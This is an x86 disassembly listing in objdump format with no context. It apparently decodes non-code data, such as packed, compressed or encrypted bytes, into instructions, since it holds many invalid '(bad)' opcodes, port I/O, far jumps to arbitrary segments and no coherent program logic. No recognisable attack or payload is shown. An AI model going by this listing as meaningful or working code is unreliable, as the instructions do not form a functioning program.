  426672:	cmp    DWORD PTR ds:0x219ec936,esp
  426678:	sbb    ah,bl
  42667a:	ror    BYTE PTR [esi-0x33],cl
  42667d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42667e:	cs cmp eax,0x285e2352
  426684:	std    
  426685:	xchg   DWORD PTR [esi+ecx*8+0x52],esi
  426689:	out    dx,eax
  42668a:	adc    DWORD PTR [esi+esi*8-0x38],esp
  42668e:	jl     0x42670e
  426690:	add    eax,0xd5cea451
  426695:	pop    eax
  426696:	retf   0x6401
  426699:	xchg   esi,eax
  42669a:	test   al,0x35
  42669c:	push   0x7d160c09
  4266a1:	inc    eax
  4266a2:	enterw 0xeb36,0xfa
  4266a7:	push   es
  4266a8:	add    edi,edx
  4266aa:	adc    ah,BYTE PTR [edi-0x47]
  4266ad:	sbb    dl,dl
  4266af:	and    esp,eax
  4266b1:	and    DWORD PTR [ebx-0x56986f50],ebx
  4266b7:	mov    edi,0xcb9da2a4
  4266bc:	addr16 sub esi,0x28
  4266c0:	sub    al,0xf1
  4266c2:	das    
  4266c3:	loopne 0x426688
  4266c5:	das    
  4266c6:	aaa    
  4266c7:	sub    BYTE PTR fs:[eax-0x323e4501],al
  4266ce:	xchg   ecx,eax
  4266cf:	adc    BYTE PTR [eax],bh
  4266d1:	shl    DWORD PTR ds:0x8afc701d,cl
  4266d7:	xor    esp,DWORD PTR [ebp-0x4b9ae41b]
  4266dd:	test   eax,0xaaa4e836
  4266e2:	jno    0x42666e
  4266e4:	mov    DWORD PTR [ecx+0x2],edi
  4266e7:	xchg   ebx,eax
  4266e8:	inc    esp
  4266e9:	(bad)  [ebx+edi*1+0x6f]
  4266ed:	mov    dl,0xa5
  4266ef:	arpl   sp,di
  4266f1:	mov    ds:0xada3bfe6,eax
  4266f6:	dec    ecx
  4266f7:	fisttp WORD PTR [eax]
  4266f9:	inc    ebx
  4266fa:	arpl   WORD PTR [eax],ax
  4266fc:	loop   0x4266c6
  4266fe:	pusha  
  4266ff:	jp     0x4266fb
  426701:	iret   
  426702:	fistp  WORD PTR [edi-0x3d]
  426705:	cmp    bh,BYTE PTR [eax+0x1d]
  426708:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426709:	es scas eax,DWORD PTR es:[edi]
  42670b:	aam    0xe8
  42670d:	lods   al,BYTE PTR ds:[esi]
  42670e:	div    DWORD PTR [ebx-0xcb431cf]
  426714:	pop    es
  426715:	stos   DWORD PTR es:[edi],eax
  426716:	mov    ecx,0xa79163d4
  42671b:	les    eax,FWORD PTR [ecx-0x39]
  42671e:	imul   edx,DWORD PTR [ebp+0x79],0x5ab63c11
  426725:	xchg   ebx,eax
  426726:	mov    ebx,0xe27d9e80
  42672b:	or     DWORD PTR [ecx],eax
  42672d:	in     eax,dx
  42672e:	fs jecxz 0x426740
  426731:	adc    DWORD PTR [ecx-0x3a],ebx
  426734:	adc    BYTE PTR [ecx],dl
  426736:	xchg   ebp,eax
  426737:	jo     0x42676f
  426739:	cwde   
  42673a:	or     BYTE PTR [ebx+ecx*2],0x5d
  42673e:	scas   al,BYTE PTR es:[edi]
  42673f:	(bad)  
  426740:	mov    ds:0x3d39954d,al
  426745:	ds mov cs,ebp
  426748:	cmp    al,0xad
  42674a:	cmp    dl,BYTE PTR [ebp+0x57]
  42674d:	out    dx,eax
  42674e:	cli    
  42674f:	push   esi
  426750:	mov    BYTE PTR [ebx+0x6],ch
  426753:	pop    ebp
  426754:	sbb    eax,0x4956e102
  426759:	jp     0x4267d9
  42675b:	add    al,0x9
  42675d:	aas    
  42675e:	int3   
  42675f:	(bad)  
  426760:	sbb    ch,BYTE PTR [edi-0x1acb6610]
  426766:	lods   al,BYTE PTR ds:[esi]
  426767:	push   esp
  426768:	inc    eax
  426769:	and    ebp,ecx
  42676b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42676c:	sbb    dh,BYTE PTR [edi+0x70d5d6e5]
  426772:	fidivr WORD PTR [eax]
  426774:	adc    al,ch
  426776:	out    0x20,al
  426778:	pop    ecx
  426779:	in     eax,dx
  42677a:	clc    
  42677b:	xor    al,0x8c
  42677d:	mov    WORD PTR [eax+edi*2],?
  426780:	ror    BYTE PTR [esi+0x55],0xf
  426784:	inc    ebx
  426785:	int    0x20
  426787:	rcr    BYTE PTR [eax+0x3b],1
  42678a:	xchg   ecx,eax
  42678b:	call   0xbb91b4e3
  426790:	jmp    0x3f5b:0x80c37e1
  426797:	scas   eax,DWORD PTR es:[edi]
  426798:	outs   dx,DWORD PTR ds:[esi]
  426799:	fistp  DWORD PTR [edi-0x33bbfe00]
  42679f:	and    eax,0xc284db86
  4267a4:	xchg   edi,eax
  4267a5:	lds    ecx,FWORD PTR [ebx-0x54679f01]
  4267ab:	das    
  4267ac:	pop    edx
  4267ad:	mov    bl,0x69
  4267af:	xor    al,BYTE PTR [esi]
  4267b1:	clc    
  4267b2:	pop    esi
  4267b3:	lods   al,BYTE PTR ds:[esi]
  4267b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4267b5:	popa   
  4267b6:	mov    bh,0x67
  4267b8:	adc    al,0x4d
  4267ba:	jne    0x42676b
  4267bc:	mov    eax,esp
  4267be:	aas    
  4267bf:	mov    ds:0xe29ed8b4,al
  4267c4:	push   edx
  4267c5:	cmp    edx,DWORD PTR [ebx+ebx*8]
  4267c8:	in     eax,0x8c
  4267ca:	jno    0x42680b
  4267cc:	adc    DWORD PTR [ebp-0x79],edx
  4267cf:	test   DWORD PTR [edx-0x6be6ccdb],0x8c0eeac9
  4267d9:	scas   al,BYTE PTR es:[edi]
  4267da:	or     dl,BYTE PTR [edi+edi*2-0x4e]
  4267de:	sbb    ah,BYTE PTR [edi+0x5e]
  4267e1:	shr    esp,0x34
  4267e4:	xchg   edx,eax
  4267e5:	sbb    BYTE PTR [eax-0x5237f1af],dl
  4267eb:	test   al,0xd3
  4267ee:	push   ebp
  4267ef:	jo     0x4267a4
  4267f1:	xor    esi,0xffffff95
  4267f4:	mov    es,WORD PTR [ebx+0x1d]
  4267f7:	inc    esp
  4267f8:	daa    
  4267f9:	push   eax
  4267fa:	in     al,0x9
  4267fc:	mov    ch,0xfe
  4267fe:	fidiv  DWORD PTR [ebp-0x1c673a81]
  426804:	je     0x42679f
  426806:	adc    dh,dl
  426808:	cmp    bl,cl
  42680a:	(bad)  
  42680b:	jo     0x42679b
  42680d:	fisub  WORD PTR [ecx]
  42680f:	fwait
  426810:	pushf  
  426811:	fldenv [edx+0x1e]
  426814:	adc    eax,0xaf7a9fc8
  426819:	ds push ebx
  42681b:	shl    esp,0x14
  42681e:	mov    al,0x5a
  426820:	hlt    
  426821:	ret    0x5a37
  426824:	int3   
  426825:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426826:	lock jmp 0xe56c298b
  42682c:	add    al,0xb9
  42682e:	dec    esi
  42682f:	cmp    ecx,esi
  426831:	xor    al,0xe8
  426833:	pusha  
  426834:	test   DWORD PTR [edi-0x70cc238d],ebp
  42683a:	sub    al,0x18
  42683c:	test   eax,0x89b63997
  426841:	adc    BYTE PTR [ecx-0x10],cl
  426844:	retf   0x1cac
  426847:	adc    al,0xb7
  426849:	out    dx,al
  42684a:	inc    edx
  42684b:	dec    edx
  42684c:	cmp    edi,DWORD PTR [ebx+0x75]
  42684f:	rcl    DWORD PTR [ebp-0x29df5624],0xb9
  426856:	fadd   QWORD PTR [ebx-0x347debec]
  42685c:	xlat   BYTE PTR ds:[ebx]
  42685d:	neg    ch
  42685f:	std    
  426860:	pop    eax
  426861:	push   cs
  426862:	xor    edi,DWORD PTR [edx-0x49]
  426865:	daa    
  426866:	mov    ecx,0x8b724320
  42686b:	mov    eax,ds:0xdfbc2f64
  426870:	imul   ecx,edi,0x49f4b7d5
  426876:	mov    ds:0x10,al
  42687b:	add    BYTE PTR [eax],al
  42687d:	add    BYTE PTR [eax],al
  42687f:	add    BYTE PTR [eax],al
  426881:	ror    esi,0xf
  426884:	ror    BYTE PTR [edi],cl
  426886:	rcr    ebp,cl
  426888:	fistp  QWORD PTR [ebp+edi*8+0x37]
  42688c:	push   esp
  42688d:	mov    dh,0xc3
  42688f:	sbb    DWORD PTR ds:0x1dfa0,0xffffffaf
  426896:	add    eax,DWORD PTR [eax]
  426898:	add    BYTE PTR [ebx-0x67],ch
  42689b:	shl    DWORD PTR [ebp+0x51177335],0x50
  4268a2:	dec    ecx
  4268a3:	loopne 0x426892
  4268a5:	jno    0x426855
  4268a7:	add    esp,DWORD PTR [ecx-0x548e5585]
  4268ad:	push   ecx
  4268ae:	fwait
  4268af:	jmp    0xdd2930e6
  4268b4:	adc    ah,BYTE PTR [esi+0x4b54c4bd]
  4268ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4268bb:	(bad)  
  4268bc:	fwait
  4268bd:	mov    WORD PTR [edi+eax*4],?
  4268c0:	fldcw  WORD PTR [ebx+0x7a706334]
  4268c6:	cdq    
  4268c7:	sbb    esi,esi
  4268c9:	pop    ss
  4268ca:	out    dx,eax
  4268cb:	add    al,BYTE PTR [ebp-0x7]
  4268ce:	add    bl,BYTE PTR [ecx]
  4268d0:	mov    eax,ds:0x73c0f0b9
  4268d5:	mov    al,ds:0xc13d09c8
  4268da:	std    
  4268db:	retf   
  4268dc:	adc    BYTE PTR [ecx+ebp*8],ah
  4268df:	jnp    0x4268dc
  4268e1:	leave  
  4268e2:	sbb    DWORD PTR [ebx+ebp*8+0xf],0xffffffba
  4268e7:	mov    ecx,0x13f0fd1e
  4268ec:	push   ss
  4268ed:	jo     0x4268e7
  4268ef:	jge    0x426946
  4268f1:	mov    ds:0xcbf12638,eax
  4268f6:	adc    ah,bh
  4268f8:	push   eax
  4268f9:	add    ch,bh
  4268fb:	cdq    
  4268fc:	cmp    BYTE PTR [eax-0x127091be],cl
  426902:	stos   DWORD PTR es:[edi],eax
  426903:	sub    eax,0x46bab846
  426908:	out    0xcf,al
  42690a:	pop    esi
  42690b:	push   eax
  42690c:	xchg   edi,eax
  42690d:	lahf   
  42690e:	adc    edi,DWORD PTR [ebx+0x3c]
  426911:	fmulp  st(2),st
  426913:	(bad)  
  426914:	mov    edi,0xe7682b46
  426919:	jbe    0x4268b8
  42691b:	push   ecx
  42691c:	pop    edx
  42691d:	iret   
  42691e:	lea    ebx,[eax]
  426920:	fadd   DWORD PTR [ebp+0x4de85c32]
  426926:	fisub  DWORD PTR [esi+0x38f0986c]
  42692c:	mov    edi,0xa9f1b7d1
  426931:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426932:	ret    0xe8ac
  426935:	icebp  
  426936:	(bad)  
  426937:	mov    ebx,0x5c377542
  42693c:	sub    eax,DWORD PTR [ebp+0x649f64a7]
  426942:	fisubr WORD PTR [esi+0xa5b3758]
  426948:	mov    ebp,0x8fc50c33
  42694d:	ja     0x42695f
  42694f:	shr    BYTE PTR cs:[edx+0x4a],1
  426953:	inc    eax
  426954:	mov    bh,0x0
  426956:	popf   
  426957:	mov    DWORD PTR [ebp-0x1],edi
  42695a:	and    edx,DWORD PTR [esi]
  42695c:	test   eax,0xcec9027
  426961:	je     0x4269bf
  426963:	or     bh,BYTE PTR [esi+0x396485a4]
  426969:	pop    ecx
  42696a:	dec    edx
  42696b:	mov    esp,0x5d52a44d
  426970:	daa    
  426971:	enter  0x81d1,0x33
  426975:	jle    0x42692e
  426977:	stc    
  426978:	sub    eax,0x1eb9e73f
  42697d:	es es jne 0x426930
  426981:	adc    al,0x9c
  426983:	mov    ebp,0x7553811c
  426988:	out    dx,al
  426989:	sahf   
  42698a:	loopne 0x426949
  42698c:	mov    cl,0x72
  42698e:	rcl    DWORD PTR [ebx],0xcc
  426991:	and    al,0x71
  426993:	test   eax,0x8834e63
  426998:	mov    esp,0x7b2a91dd
  42699d:	sbb    ah,cl
  42699f:	cwde   
  4269a0:	leave  
  4269a1:	popa   
  4269a2:	xlat   BYTE PTR ds:[ebx]
  4269a3:	icebp  
  4269a4:	sub    ah,al
  4269a6:	enter  0xbbe9,0x66
  4269aa:	or     dh,BYTE PTR [ebx-0x4c]
  4269ad:	jmp    0x4269d1
  4269af:	(bad)  
  4269b0:	fsubr  DWORD PTR [edi+0x21]
  4269b3:	out    dx,al
  4269b4:	adc    DWORD PTR [edi+0x2f],esi
  4269b7:	sbb    eax,0x5f3da7d
  4269bc:	arpl   si,sp
  4269be:	fsubp  st(5),st
  4269c0:	sar    DWORD PTR [edi],cl
  4269c2:	sub    al,0xa6
  4269c4:	xchg   ecx,eax
  4269c5:	mov    bl,0x75
  4269c7:	inc    ecx
  4269c8:	js     0x426989
  4269ca:	fwait
  4269cb:	call   0xdf80b9b6
  4269d0:	inc    ecx
  4269d1:	jnp    0x426a4e
  4269d3:	and    esi,DWORD PTR [edi]
  4269d5:	push   ecx
  4269d6:	mov    DWORD PTR [eax],0xcd718f7e
  4269dc:	jle    0x42696a
  4269de:	int    0xc8
  4269e0:	mov    eax,DWORD PTR [edi-0x44bf499c]
  4269e6:	dec    eax
  4269e7:	mov    BYTE PTR [eax+0x5126b660],ch
  4269ed:	push   ds
  4269ee:	ss mov cl,0xab
  4269f1:	ja     0x4269d7
  4269f3:	lds    ecx,FWORD PTR [ebp+0x47]
  4269f6:	add    eax,0xae097fb4
  4269fb:	daa    
  4269fc:	mov    bl,0xe7
  4269fe:	xor    DWORD PTR [esi+ebp*4],0xffffff94
  426a02:	xor    edi,esi
  426a04:	ror    DWORD PTR [ebx+0x44],1
  426a07:	pop    ss
  426a08:	xor    esi,eax
  426a0a:	xor    al,0x3f
  426a0c:	dec    ebx
  426a0d:	push   0xffffff96
  426a0f:	jae    0x4269ef
  426a11:	sbb    bl,BYTE PTR [esi]
  426a13:	inc    esi
  426a14:	adc    DWORD PTR ss:[edx+ebx*4+0x38b8a9e9],edi
  426a1c:	sti    
  426a1d:	add    bl,bl
  426a1f:	xlat   BYTE PTR ds:[ebx]
  426a20:	jmp    0x426a03
  426a22:	xchg   edi,eax
  426a23:	ja     0x426aa3
  426a25:	push   cs
  426a26:	lods   eax,DWORD PTR ds:[esi]
  426a27:	cmp    BYTE PTR [edi-0x6086759d],bl
  426a2d:	add    al,0x43
  426a2f:	and    eax,0xf22259ee
  426a34:	adc    al,0xa0
  426a36:	inc    ecx
  426a37:	movaps xmm4,xmm2
  426a3a:	mov    eax,0x46f4573f
  426a3f:	xchg   esi,eax
  426a40:	xor    eax,0xa73f2159
  426a45:	call   0x6cafe4a5
  426a4a:	inc    edx
  426a4b:	and    DWORD PTR [eax-0x10],ecx
  426a4e:	rcr    ecx,0x6b
  426a51:	retf   0xf65
  426a54:	iret   
  426a55:	pushf  
  426a56:	adc    DWORD PTR [edi-0x5333b0f3],edi
  426a5c:	ficom  WORD PTR [edi]
  426a5e:	mov    ds,ecx
  426a60:	gs enter 0x501e,0xbf
  426a65:	bound  ecx,QWORD PTR [ebx]
  426a67:	mov    edi,0x5597dae9
  426a6c:	pop    esp
  426a6d:	shl    DWORD PTR [eax-0x7f],1
  426a70:	sub    eax,0x28c3e05f
  426a75:	cmc    
  426a76:	arpl   si,ax
  426a78:	inc    ebx
  426a79:	mov    ecx,0x912e49b
  426a7e:	dec    esp
  426a7f:	(bad)  
  426a81:	jo     0x426a08
  426a83:	loopne 0x426ae1
  426a85:	iret   
  426a86:	add    al,0x10
  426a88:	push   ss
  426a89:	xor    bh,0xb0
  426a8c:	(bad)  
  426a8d:	icebp  
  426a8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426a8f:	std    
  426a90:	sub    eax,0x4674ec02
  426a95:	push   edi
  426a96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426a97:	adc    eax,0x9e9f0f14
  426a9c:	sub    BYTE PTR [edi-0x1c659d81],dl
  426aa2:	push   edx
  426aa3:	dec    ebp
  426aa4:	xor    DWORD PTR [eax],eax
  426aa6:	lahf   
  426aa7:	clc    
  426aa8:	pop    edx
  426aa9:	test   eax,0xc22cfd56
  426aae:	and    eax,0x185a1598
  426ab3:	add    dh,BYTE PTR [eax+0x7da3331]
  426ab9:	repnz pop ebx
  426abb:	cdq    
  426abc:	hlt    
  426abd:	mov    WORD PTR [eax+edi*8+0x11],cs
  426ac1:	inc    ecx
  426ac2:	std    
  426ac3:	xchg   edx,eax
  426ac4:	pop    edx
  426ac5:	sbb    esi,edi
  426ac7:	push   esp
  426ac8:	mov    eax,DWORD PTR [ebp+0x2e9a51d5]
  426ace:	pop    esi
  426acf:	jmp    0x9833:0xf3a625d8
  426ad6:	aad    0xa2
  426ad8:	inc    ebx
  426ad9:	lahf   
  426ada:	in     eax,0xa5
  426adc:	jecxz  0x426a92
  426ade:	pop    edi
  426adf:	pushf  
  426ae0:	mov    al,0xfa
  426ae2:	xchg   edi,eax
  426ae3:	ins    BYTE PTR es:[edi],dx
  426ae4:	test   DWORD PTR [ecx],0xf5222889
  426aea:	pusha  
  426aeb:	fcom   QWORD PTR ds:0x4db81223
  426af1:	dec    ebp
  426af2:	aam    0x24
  426af4:	dec    ecx
  426af5:	dec    esp
  426af6:	jmp    0x426b42
  426af8:	lds    ebx,FWORD PTR [edx-0x7ec1cb32]
  426afe:	sar    ebp,1
  426b00:	xchg   edi,eax
  426b02:	mov    bh,0xd1
  426b04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426b05:	test   eax,0x41f84bae
  426b0a:	test   eax,0xa15743a
  426b0f:	mov    dl,0xce
  426b11:	(bad)  
  426b12:	lds    edi,FWORD PTR [esi]
  426b14:	ret    
  426b15:	fld    st(5)
  426b17:	sbb    al,0xb9
  426b19:	pop    ds
  426b1a:	test   al,0xd3
  426b1c:	imul   ebp,DWORD PTR [edx+0x27],0xffffffc7
  426b20:	test   DWORD PTR [edx],0xda8a9b2f
  426b26:	adc    eax,DWORD PTR [esi]
  426b28:	fsub   DWORD PTR [ebx]
  426b2a:	les    ecx,FWORD PTR cs:[eax]
  426b2d:	mov    ch,0xaf
  426b2f:	cmp    eax,0x5b8f853e
  426b34:	(bad)  
  426b35:	mov    bh,0xf2
  426b37:	jle    0x426b6e
  426b39:	cli    
  426b3a:	push   0xffffffee
  426b3c:	jecxz  0x426b0e
  426b3e:	loopne 0x426b7a
  426b40:	push   ebx
  426b41:	jne    0x426b49
  426b43:	dec    eax
  426b44:	adc    eax,0xf9fcb464
  426b49:	sahf   
  426b4a:	cmp    al,0x18
  426b4c:	cmp    cl,BYTE PTR [eax+0x376eb52e]
  426b52:	test   DWORD PTR [edi],esi
  426b54:	jp     0x426adc
  426b56:	xchg   ebp,eax
  426b57:	int3   
  426b58:	pop    ss
  426b59:	mov    ah,0x6e
  426b5b:	dec    esp
  426b5c:	adc    DWORD PTR [eax],esp
  426b5e:	call   0x6f9a60c9
  426b63:	cmp    eax,0xabaaf0b2
  426b68:	lods   eax,DWORD PTR ds:[esi]
  426b69:	int3   
  426b6a:	mov    al,0xef
  426b6c:	inc    edx
  426b6d:	int    0x72
  426b6f:	loopne 0x426ba4
  426b71:	adc    cl,BYTE PTR [ecx]
  426b73:	sub    al,0xc8
  426b75:	popf   
  426b76:	add    ecx,DWORD PTR [ecx]
  426b78:	mov    BYTE PTR [ebp-0x3f],bh
  426b7b:	pusha  
  426b7c:	lahf   
  426b7d:	xrelease xchg BYTE PTR [eax],cl
  426b80:	mov    al,ds:0x1ce1e0be
  426b85:	fld    st(4)
  426b87:	cmp    ah,bh
  426b89:	in     al,dx
  426b8a:	mov    edx,0x3a8d8d4a
  426b8f:	jp     0x426b83
  426b91:	lea    eax,[eax]
  426b93:	out    dx,eax
  426b94:	mov    ebx,0x1c4aabcc
  426b99:	(bad)  
  426b9c:	add    eax,0x7d699baa
  426ba1:	stos   DWORD PTR es:[edi],eax
  426ba2:	and    al,0xd6
  426ba4:	jle    0x426c0b
  426ba6:	lods   al,BYTE PTR ds:[esi]
  426ba7:	mov    edi,ebx
  426ba9:	nop
  426baa:	idiv   DWORD PTR [esi+0x4320d11d]
  426bb0:	inc    ebx
  426bb1:	adc    BYTE PTR [esi+0x271adb59],cl
  426bb7:	jmp    0xd4e4:0x17059d76
  426bbe:	popa   
  426bbf:	repz cmp eax,ecx
  426bc2:	mov    eax,0x30493ee2
  426bc7:	xchg   edx,eax
  426bc8:	mov    ecx,0xfa355f67
  426bcd:	in     eax,0x14
  426bcf:	lods   eax,DWORD PTR ds:[esi]
  426bd0:	cmp    DWORD PTR [edi+0x69bfed69],ebp
  426bd6:	xlat   BYTE PTR ds:[ebx]
  426bd7:	ret    
  426bd8:	dec    edx
  426bd9:	(bad)  
  426bda:	fistp  DWORD PTR [ebx]
  426bdc:	shr    BYTE PTR [ebp+0x3a3670a],1
  426be2:	ins    DWORD PTR es:[edi],dx
  426be3:	pop    eax
  426be4:	xchg   ebp,eax
  426be5:	inc    edx
  426be6:	cmp    al,0xa
  426be8:	push   0xc58e11a4
  426bed:	test   eax,0x8383712f
  426bf2:	test   BYTE PTR [ebx],ah
  426bf4:	(bad)  
  426bf5:	dec    DWORD PTR [esi]
  426bf7:	mov    esp,0x7c4a36e
  426bfc:	mov    eax,ds:0x7a3e7ce5
  426c01:	cmp    eax,0x8e6b0b61
  426c06:	mov    edi,0x2ab80a2b
  426c0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426c0c:	(bad)  
  426c0d:	adc    al,0x54
  426c0f:	test   eax,0xb8dc1880
  426c14:	jecxz  0x426c0c
  426c16:	loop   0x426c19
  426c18:	jnp    0x426bed
  426c1a:	lds    ebx,FWORD PTR [esi-0x3a68bcb3]
  426c20:	dec    ebx
  426c21:	jmp    0x426bfa
  426c23:	xor    BYTE PTR [esi+ecx*8],bl
  426c26:	sbb    esi,edx
  426c28:	fwait
  426c29:	loope  0x426c50
  426c2b:	stos   BYTE PTR es:[edi],al
  426c2c:	inc    esp
  426c2d:	xchg   edi,eax
  426c2e:	cmc    
  426c2f:	mov    al,0xe5
  426c31:	mov    dh,0x1f
  426c33:	add    ebp,DWORD PTR [ebx-0x27]
  426c36:	push   0x71a9b143
  426c3b:	adc    al,0xe4
  426c3d:	iret   
  426c3e:	inc    ebp
  426c3f:	int    0x15
  426c41:	push   es
  426c42:	lea    eax,[ecx]
  426c44:	dec    esi
  426c45:	dec    ebp
  426c46:	fidiv  WORD PTR [eax+eax*1+0x0]
  426c4d:	add    BYTE PTR [eax],al
  426c4f:	add    BYTE PTR [eax],al
  426c51:	lock lock pusha 
  426c54:	pushf  
  426c55:	pusha  
  426c56:	pushf  
  426c57:	cld    
  426c58:	cld    
  426c59:	push   es
  426c5a:	dec    edx
  426c5b:	lock cmp ebp,DWORD PTR [ebp+0x4f9a205d]
  426c62:	jecxz  0x426c65
  426c64:	add    BYTE PTR [edi+0x2b000003],ch
  426c6a:	mov    edi,esi
  426c6c:	jp     0x426ced
  426c6e:	jge    0x426ce9
  426c70:	inc    edx
  426c71:	xchg   ecx,eax
  426c72:	jno    0x426c12
  426c74:	stos   DWORD PTR es:[edi],eax
  426c75:	adc    cl,BYTE PTR [esp+edx*2]
  426c78:	pop    ebp
  426c79:	sbb    bh,ah
  426c7b:	mov    DWORD PTR [edx+0x50],ebp
  426c7e:	sbb    DWORD PTR [eax-0x14],edi
  426c81:	jb     0x426c92
  426c83:	test   BYTE PTR [eax],dl
  426c85:	int    0x6
  426c87:	jg     0x426cfc
  426c89:	mov    esi,0xcc66e199
  426c8e:	aas    
  426c8f:	pop    eax
  426c90:	xor    eax,0xa98f5c36
  426c95:	aaa    
  426c96:	test   al,0xb5
  426c98:	mov    WORD PTR [ebp+edx*4-0x8],cs
  426c9c:	test   al,0x74
  426c9e:	sbb    eax,ebp
  426ca0:	mov    ch,ah
  426ca2:	scas   al,BYTE PTR es:[edi]
  426ca3:	imul   esp,DWORD PTR [edi+0x5a255c1d],0xbff69f5
  426cad:	mov    ecx,DWORD PTR [ecx-0x2c467678]
  426cb3:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  426cb5:	jle    0x426c94
  426cb7:	repnz inc edx
  426cb9:	push   ecx
  426cba:	add    ecx,esi
  426cbc:	mov    ch,BYTE PTR ds:0xea47
  426cc1:	(bad)  
  426cc2:	pop    eax
  426cc3:	pop    edx
  426cc4:	daa    
  426cc5:	mov    WORD PTR [ebx+esi*4-0x75],es
  426cc9:	mov    eax,ds:0x9446bb9f
  426cce:	in     eax,dx
  426ccf:	loop   0x426d13
  426cd1:	pop    DWORD PTR [ebx+esi*2+0x7a]
  426cd5:	pop    edx
  426cd6:	loop   0x426ce7
  426cd8:	dec    edi
  426cd9:	into   
  426cda:	inc    esi
  426cdb:	outs   dx,BYTE PTR ds:[esi]
  426cdc:	hlt    
  426cdd:	imul   ecx,DWORD PTR [esi+0x4ecb54],0x1b
  426ce4:	and    BYTE PTR [esi-0x7e0eb837],ch
  426cea:	add    DWORD PTR [ebp+esi*2+0x6d],edi
  426cee:	sahf   
  426cef:	mov    eax,0x15d75ef9
  426cf4:	lods   al,BYTE PTR ds:[esi]
  426cf5:	dec    ebp
  426cf6:	out    0x9d,eax
  426cf8:	sbb    al,0x53
  426cfa:	pop    esi
  426cfb:	cmp    al,0x92
  426cfd:	pop    edi
  426cfe:	test   eax,0xfdfd4236
  426d03:	mov    ebx,eax
  426d05:	or     DWORD PTR [esi+0x4222e72],esi
  426d0b:	sub    bh,BYTE PTR [ebp-0x43]
  426d0e:	dec    edx
  426d0f:	sahf   
  426d10:	inc    ebp
  426d11:	pop    eax
  426d12:	adc    BYTE PTR [esi],ch
  426d14:	out    0x2c,eax
  426d16:	es mov ah,0x57
  426d19:	adc    al,0x1a
  426d1b:	or     bh,ch
  426d1d:	pop    esp
  426d1e:	pop    eax
  426d1f:	rcr    BYTE PTR [esi-0x7492ed95],cl
  426d25:	into   
  426d26:	sbb    bl,BYTE PTR [ebx-0x6b]
  426d29:	in     eax,0xd8
  426d2b:	clc    
  426d2c:	fistp  DWORD PTR [edi+0x270ff1c7]
  426d32:	mov    ah,0x2c
  426d34:	(bad)  
  426d35:	cli    
  426d36:	fmul   DWORD PTR [ecx-0x52]
  426d39:	(bad)  
  426d3a:	dec    ebx
  426d3c:	mov    dl,0xb9
  426d3e:	jmp    0x426d5b
  426d40:	ss jle 0x426d13
  426d43:	popf   
  426d44:	mov    ch,0xd
  426d46:	inc    ecx
  426d47:	and    BYTE PTR ds:0xae27fce2,bh
  426d4d:	xor    DWORD PTR ds:0x7f0d8827,eax
  426d53:	in     eax,dx
  426d54:	xlat   BYTE PTR ds:[ebx]
  426d55:	sti    
  426d56:	dec    edx
  426d57:	inc    ebx
  426d58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426d59:	jo     0x426d8e
  426d5b:	(bad)  
  426d5c:	jmp    0x426d10
  426d5e:	out    0x66,al
  426d60:	jge    0x426daa
  426d62:	push   ecx
  426d63:	cli    
  426d64:	inc    ebx
  426d65:	in     eax,0x34
  426d67:	lock lahf 
  426d69:	cdq    
  426d6a:	dec    ecx
  426d6b:	idiv   ebx
  426d6d:	cmp    al,0xf9
  426d6f:	push   0x56
  426d71:	lods   al,BYTE PTR ds:[esi]
  426d72:	in     eax,0x72
  426d74:	mov    al,ds:0xb6db0a7f
  426d79:	pop    esi
  426d7a:	hlt    
  426d7b:	push   0x24
  426d7d:	inc    eax
  426d7e:	nop
  426d7f:	inc    esi
  426d80:	mov    dl,0xbd
  426d82:	fs sub al,0xef
  426d85:	adc    al,0xb7
  426d87:	xchg   edx,eax
  426d88:	cmp    ecx,DWORD PTR [edx-0x28]
  426d8b:	xor    al,0xc
  426d8d:	mov    esp,0x4b33dfd3
  426d92:	cmp    eax,0xf7b773a3
  426d97:	push   edx
  426d98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426d99:	jmp    0xf102:0xc8dc7595
  426da0:	cs out 0x56,al
  426da3:	icebp  
  426da4:	outs   dx,BYTE PTR ds:[esi]
  426da5:	ja     0x426d6a
  426da7:	mov    BYTE PTR [edi+ecx*4+0x2582d963],0xa9
  426daf:	je     0x426d4d
  426db1:	mov    edi,0x133116ba
  426db6:	mov    eax,0xb2a33a5f
  426dbb:	jmp    0xbe82:0xc4155a03
  426dc2:	repz cmc 
  426dc4:	int    0x17
  426dc6:	pop    es
  426dc7:	jns    0x426de1
  426dc9:	jns    0x426e0b
  426dcb:	mov    ds:0xfae102fa,al
  426dd0:	cmp    eax,0xf4249fd2
  426dd5:	mov    ah,0x52
  426dd7:	sub    ecx,DWORD PTR [ebx]
  426dd9:	sub    BYTE PTR [eax+edx*8-0x2d],al
  426ddd:	or     cl,al
  426ddf:	retf   0x7c26
  426de2:	jg     0x426db0
  426de4:	ins    DWORD PTR es:[edi],dx
  426de5:	pop    eax
  426de6:	int    0xd0
  426de8:	addr16 cmp al,0x52
  426deb:	out    dx,eax
  426dec:	js     0x426e18
  426dee:	mov    DWORD PTR [edx],0x172e573c
  426df4:	fs adc al,0xbc
  426df7:	lahf   
  426df8:	mov    cl,0x8a
  426dfa:	jbe    0x426da6
  426dfc:	jecxz  0x426da0
  426dfe:	pop    ebp
  426dff:	bound  esi,QWORD PTR [edx]
  426e01:	cdq    
  426e02:	aaa    
  426e03:	enter  0xe1be,0x0
  426e07:	inc    edx
  426e08:	mov    bl,BYTE PTR [eax+eiz*2-0x3282441f]
  426e0f:	jae    0x426e16
  426e11:	fwait
  426e12:	pushf  
  426e13:	and    dl,BYTE PTR [esi]
  426e15:	retf   
  426e16:	jle    0x426e80
  426e18:	push   ds
  426e19:	cmp    eax,0xa076af24
  426e1e:	jae    0x426dd0
  426e20:	sbb    edx,DWORD PTR [esi+0x385ecfe1]
